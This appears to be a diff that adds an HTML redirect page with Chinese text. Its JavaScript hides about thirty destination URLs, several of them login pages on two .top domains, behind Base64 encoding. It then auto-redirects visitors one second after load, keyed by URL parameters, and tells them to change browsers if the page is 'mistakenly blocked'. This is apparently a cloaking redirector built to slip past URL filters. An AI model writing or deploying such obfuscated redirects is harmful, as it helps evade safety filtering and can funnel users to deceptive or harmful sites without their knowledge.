@@ -1,0 +1,179 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>即将前往主页...</title>
+    <script type="text/javascript">
+      function Base64() {
+        this._keyStr =
+          "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
+
+        // 公共方法：编码
+        this.encode = function (input) {
+          let output = "";
+          let chr1, chr2, chr3, enc1, enc2, enc3, enc4;
+          let i = 0;
+          input = this._utf8_encode(input);
+          while (i < input.length) {
+            chr1 = input.charCodeAt(i++);
+            chr2 = input.charCodeAt(i++);
+            chr3 = input.charCodeAt(i++);
+            enc1 = chr1 >> 2;
+            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
+            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
+            enc4 = chr3 & 63;
+            if (isNaN(chr2)) enc3 = enc4 = 64;
+            else if (isNaN(chr3)) enc4 = 64;
+
+            output +=
+              this._keyStr.charAt(enc1) +
+              this._keyStr.charAt(enc2) +
+              this._keyStr.charAt(enc3) +
+              this._keyStr.charAt(enc4);
+          }
+          return output;
+        };
+
+        // 公共方法：解码
+        this.decode = function (input) {
+          let output = "";
+          let chr1, chr2, chr3;
+          let enc1, enc2, enc3, enc4;
+          let i = 0;
+          input = input.replace(/[^A-Za-z0-9+/=]/g, "");
+          while (i < input.length) {
+            enc1 = this._keyStr.indexOf(input.charAt(i++));
+            enc2 = this._keyStr.indexOf(input.charAt(i++));
+            enc3 = this._keyStr.indexOf(input.charAt(i++));
+            enc4 = this._keyStr.indexOf(input.charAt(i++));
+            chr1 = (enc1 << 2) | (enc2 >> 4);
+            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
+            chr3 = ((enc3 & 3) << 6) | enc4;
+            output += String.fromCharCode(chr1);
+            if (enc3 != 64) output += String.fromCharCode(chr2);
+            if (enc4 != 64) output += String.fromCharCode(chr3);
+          }
+          return this._utf8_decode(output);
+        };
+
+        // UTF-8 编码
+        this._utf8_encode = function (string) {
+          string = string.replace(/rn/g, "n");
+          let utftext = "";
+          for (let n = 0; n < string.length; n++) {
+            const c = string.charCodeAt(n);
+            if (c < 128) utftext += String.fromCharCode(c);
+            else if (c > 127 && c < 2048) {
+              utftext += String.fromCharCode((c >> 6) | 192);
+              utftext += String.fromCharCode((c & 63) | 128);
+            } else {
+              utftext += String.fromCharCode((c >> 12) | 224);
+              utftext += String.fromCharCode(((c >> 6) & 63) | 128);
+              utftext += String.fromCharCode((c & 63) | 128);
+            }
+          }
+          return utftext;
+        };
+
+        // UTF-8 解码
+        this._utf8_decode = function (utftext) {
+          let string = "";
+          let i = 0;
+          let c = (c1 = c2 = 0);
+          while (i < utftext.length) {
+            c = utftext.charCodeAt(i);
+            if (c < 128) {
+              string += String.fromCharCode(c);
+              i++;
+            } else if (c > 191 && c < 224) {
+              c2 = utftext.charCodeAt(i + 1);
+              string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
+              i += 2;
+            } else {
+              c2 = utftext.charCodeAt(i + 1);
+              c3 = utftext.charCodeAt(i + 2);
+              string += String.fromCharCode(
+                ((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63)
+              );
+              i += 3;
+            }
+          }
+          return string;
+        };
+      }
+
+      function getUrlParam(param) {
+        const params = new URLSearchParams(window.location.search);
+        return params.get(param); // 返回指定参数的值
+      }
+
+      function inNewPage() {
+        const base = new Base64();
+
+        // 从 URL 中获取 tid 和 id
+        const tid = getUrlParam("tid"); // 确认这个参数是否正确
+        const idValue = getUrlParam("id");
+
+        // 创建 Base64 编码的链接
+        const links = {
+          tt1: "aHR0cHM6Ly90eWNwMS50b3AvaW5kZXg=",
+          tt2: "aHR0cHM6Ly90eWNwMi50b3AvaW5kZXg=",
+          ttf1: "aHR0cHM6Ly90eWNwMS50b3AvaW5kZXhm",
+          ttf2: "aHR0cHM6Ly90eWNwMi50b3AvaW5kZXhm",
+          dm1: "aHR0cHM6Ly90eWNwMS50b3AvaW5kZXht",
+          dm2: "aHR0cHM6Ly90eWNwMi50b3AvaW5kZXht",
+          dmf1: "aHR0cHM6Ly90eWNwMS50b3AvaW5kZXhtZg==",
+          dmf2: "aHR0cHM6Ly90eWNwMi50b3AvaW5kZXhtZg==",
+          nv1: "aHR0cHM6Ly90eWNwMS50b3AvbG9naW5pbmRleA==",
+          nv2: "aHR0cHM6Ly90eWNwMi50b3AvbG9naW5pbmRleA==",
+          nvf1: "aHR0cHM6Ly90eWNwMS50b3AvbG9naW5pbmRleGY=",
+          nvf2: "aHR0cHM6Ly90eWNwMi50b3AvbG9naW5pbmRleGY=",
+          hp1: "aHR0cHM6Ly90eWNwMS50b3AvaHBqeQ==",
+          hp2: "aHR0cHM6Ly90eWNwMi50b3AvaHBqeQ==",
+          hpf1: "aHR0cHM6Ly90eWNwMS50b3AvaHBqeWY=",
+          hpf2: "aHR0cHM6Ly90eWNwMi50b3AvaHBqeWY=",
+          pv1: "aHR0cHM6Ly90eWNwMS50b3AvcHZw",
+          pv2: "aHR0cHM6Ly90eWNwMi50b3AvcHZw",
+          pvf1: "aHR0cHM6Ly90eWNwMS50b3AvcHZwZg==",
+          pvf2: "aHR0cHM6Ly90eWNwMi50b3AvcHZwZg==",
+          dz1: "aHR0cHM6Ly90eWNwMS50b3AvZHpwZA==",
+          dz2: "aHR0cHM6Ly90eWNwMi50b3AvZHpwZA==",
+          dzf1: "aHR0cHM6Ly90eWNwMS50b3AvZHpwZGY=",
+          dzf2: "aHR0cHM6Ly90eWNwMi50b3AvZHpwZGY=",
+          wz1: "aHR0cHM6Ly90eWNwMS50b3Avd3pyeQ==",
+          wz2: "aHR0cHM6Ly90eWNwMi50b3Avd3pyeQ==",
+          wzf1: "aHR0cHM6Ly90eWNwMS50b3Avd3pyeWY=",
+          wzf2: "aHR0cHM6Ly90eWNwMi50b3Avd3pyeWY=",
+          cl1: "aHR0cHM6Ly90eWNwMS50b3AvY3VsYg==",
+          cl2: "aHR0cHM6Ly90eWNwMi50b3AvY3VsYg==",
+          tp31: "#",
+          tp32: "#",
+          tp33: "#",
+          tp34: "#",
+          tp35: "#",
+          tp36: "#",
+        };
+
+        // 根据 tid 获取对应的 Base64 编码链接，确认是否存在匹配项
+        const targetBase64 = links[tid] || links["tt1"]; // 如果没有匹配，则使用 tt1
+
+        // 解码最终链接
+        const targetUrl = base.decode(targetBase64);
+
+        // 拼接最终的 URL
+        const finalUrl = targetUrl + "?id=" + idValue; // 形成最终跳转地址
+
+        // 跳转到新的 URL
+        console.log(finalUrl); // 添加日志以便调试（查看跳转网址）
+        window.location.href = finalUrl; // 实际跳转
+      }
+
+      setTimeout(inNewPage, 1000); // 延时1秒执行
+    </script>
+  </head>
+
+  <body>
+    <p>即将前往主页...</p>
+    <p>若打不开！或被误拦截！请更换浏览器尝试！</p>
+  </body>
+</html>
